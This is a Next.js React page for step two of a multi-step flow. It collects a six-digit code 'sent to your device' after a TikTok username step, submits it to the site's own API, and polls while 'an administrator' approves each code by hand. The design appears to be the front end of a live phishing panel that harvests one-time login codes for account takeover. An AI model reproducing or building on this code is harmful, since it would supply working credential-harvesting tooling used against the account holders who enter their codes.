
'use client';

import { zodResolver } from '@hookform/resolvers/zod';
import { ArrowLeft, KeyRound, Loader2, AlertCircle, ArrowRight } from 'lucide-react';
import { useRouter } from 'next/navigation';
import { useForm } from 'react-hook-form';
import * as z from 'zod';
import { useToast } from '@/hooks/use-toast';
import { useAuth } from '@/hooks/use-auth';
import { useEffect, useState, useCallback } from 'react';

import { Button } from '@/components/ui/button';
import { Form, FormControl, FormField, FormItem, FormMessage } from '@/components/ui/form';
import { InputOTP, InputOTPGroup, InputOTPSlot } from '@/components/ui/input-otp';
import { Progress } from '@/components/ui/progress';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import type { Submission } from '@/lib/types';


const formSchema = z.object({
  verificationCode: z.string().length(6, "Code must be 6 digits."),
});

type FormValues = z.infer<typeof formSchema>;

export default function VerifyCodePage() {
    const router = useRouter();
    const { user } = useAuth();
    const { toast } = useToast();
    const { formState, ...form } = useForm<FormValues>({
        resolver: zodResolver(formSchema),
        defaultValues: { verificationCode: '' },
    });

    const [submission, setSubmission] = useState<Submission | null>(null);
    const [isPageLoading, setIsPageLoading] = useState(true);

    const [countdown, setCountdown] = useState(30);
    const [canResend, setCanResend] = useState(false);
    
    const isPending = submission?.verificationCodeStatus === 'pending' && !!submission.verificationCode;

    const fetchSubmission = useCallback(async () => {
        if (!user?.id) return;
        setIsPageLoading(true);
        try {
            const res = await fetch(`/api/submissions?id=${user.id}`);
            if (res.status === 404) {
                toast({ variant: 'destructive', title: 'Error', description: 'Submission not found. Redirecting...' });
                router.replace('/start');
                return;
            }
            if (!res.ok) throw new Error('Failed to fetch submission data.');
            const data: Submission = await res.json();
            setSubmission(data);

            if (data.tiktokUsernameStatus !== 'approved') {
                 router.replace('/start');
                 return;
            }
            if (data.verificationCodeStatus === 'approved') {
                router.push('/start/select-number');
                return;
            }
             if (data.verificationCode) {
                form.setValue('verificationCode', data.verificationCode);
            }

        } catch (err: any) {
            toast({ variant: 'destructive', title: 'Error', description: err.message });
        } finally {
            setIsPageLoading(false);
        }
    }, [user?.id, router, toast, form]);

    useEffect(() => {
        if(user) {
            fetchSubmission();
        } else {
            setIsPageLoading(false);
        }
    }, [user, fetchSubmission]);
    
    // Polling effect
    useEffect(() => {
        if (isPending) {
            const interval = setInterval(() => {
                fetchSubmission();
            }, 3000); // Poll every 3 seconds
            return () => clearInterval(interval);
        }
    }, [isPending, fetchSubmission]);


    // Resend code timer
    useEffect(() => {
      if (canResend) return;
      const timer = setInterval(() => {
        setCountdown(prev => {
          if (prev <= 1) {
            setCanResend(true);
            clearInterval(timer);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);

      return () => clearInterval(timer);
    }, [canResend]);


    const handleResendCode = useCallback(() => {
        setCanResend(false);
        setCountdown(30);
        // Here you would add logic to actually resend the code via an API
        toast({
            title: 'Code Resent',
            description: 'A new verification code has been sent (simulation).',
        });
    }, [toast]);
    
    
    const onSubmit = async (values: FormValues) => {
        if (!user) return toast({ variant: 'destructive', title: 'Error', description: 'You must be logged in.' });
        
        try {
             const response = await fetch('/api/submissions', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    id: user.id,
                    step: 'verificationCode',
                    data: values.verificationCode,
                }),
            });
            if (!response.ok) {
                 const errorData = await response.json();
                 throw new Error(errorData.message || 'Failed to submit verification code.');
            }
            toast({ title: 'Code Submitted', description: 'Please wait for admin approval.' });
            await fetchSubmission(); // Refetch to get the pending state
        } catch (err: any) {
            toast({ variant: 'destructive', title: 'Submission Failed', description: err.message });
        }
    };
    
    const { isSubmitting } = formState;
    const isRejected = submission?.verificationCodeStatus === 'rejected';

    if (isPageLoading) {
        return <div className="flex justify-center items-center h-full"><Loader2 className="animate-spin h-8 w-8 text-primary" /></div>
    }

    return (
        <div className="w-full max-w-lg">
             <div className="text-center mb-8">
                <div className="flex h-16 w-16 items-center justify-center rounded-full bg-primary/10 text-primary mb-4 mx-auto">
                    <KeyRound className="h-8 w-8" />
                </div>
                <h1 className="text-2xl font-bold">Step 2: Verification Code</h1>
                <p className="text-muted-foreground">Enter the 6-digit code sent to your device.</p>
            </div>

            <Progress value={50} className="w-[80%] mx-auto mb-8" />
            
             {isPending && (
                 <Alert className="mb-6 animate-pulse">
                    <Loader2 className="h-4 w-4 animate-spin mr-2" />
                    <AlertTitle>Approval Pending</AlertTitle>
                    <AlertDescription>An administrator is currently verifying your code. This page will automatically update once approved.</AlertDescription>
                </Alert>
            )}

             {isRejected && (
                 <Alert variant="destructive" className="mb-6">
                    <AlertCircle className="h-4 w-4" />
                    <AlertTitle>Code Rejected</AlertTitle>
                    <AlertDescription>
                        {submission?.rejectionReason || "The code you entered was incorrect. Please try again."}
                         <Button variant="link" onClick={handleResendCode} className="p-0 h-auto ml-1" disabled={!canResend}>
                           {canResend ? 'Resend code.' : `Resend in ${countdown}s.`}
                         </Button>
                    </AlertDescription>
                </Alert>
            )}

            <Form {...form} formState={formState}>
                <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                    <FormField
                        control={form.control}
                        name="verificationCode"
                        render={({ field }) => (
                            <FormItem>
                            <FormControl>
                                <div className="flex justify-center">
                                <InputOTP maxLength={6} {...field} disabled={isSubmitting || isPending}>
                                    <InputOTPGroup>
                                        <InputOTPSlot index={0} />
                                        <InputOTPSlot index={1} />
                                        <InputOTPSlot index={2} />
                                        <InputOTPSlot index={3} />
                                        <InputOTPSlot index={4} />
                                        <InputOTPSlot index={5} />
                                    </InputOTPGroup>
                                </InputOTP>
                                </div>
                            </FormControl>
                            <FormMessage className="text-center" />
                            </FormItem>
                        )}
                    />

                     {!isPending && !isRejected && (
                        <div className="text-center text-sm text-muted-foreground">
                            {canResend ? (
                                <Button type="button" variant="link" onClick={handleResendCode} className="p-0 h-auto">
                                    Resend Code
                                </Button>
                            ) : (
                                <p>Resend code in {countdown}s</p>
                            )}
                        </div>
                    )}
                    
                    <div className="flex justify-between pt-4">
                         <Button type="button" variant="outline" size="lg" className="rounded-full" onClick={() => router.back()} disabled={isSubmitting || isPending}>
                            <ArrowLeft className="mr-2 h-5 w-5" />
                            Back
                        </Button>
                        <Button type="submit" size="lg" className="rounded-full" disabled={isSubmitting || isPending}>
                            {(isSubmitting || isPending) && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                            {isPending ? 'Waiting for Approval...' : 'Submit for Approval'}
                             {!isPending && <ArrowRight className="ml-2 h-5 w-5" />}
                        </Button>
                    </div>
                </form>
            </Form>
        </div>
    );
}
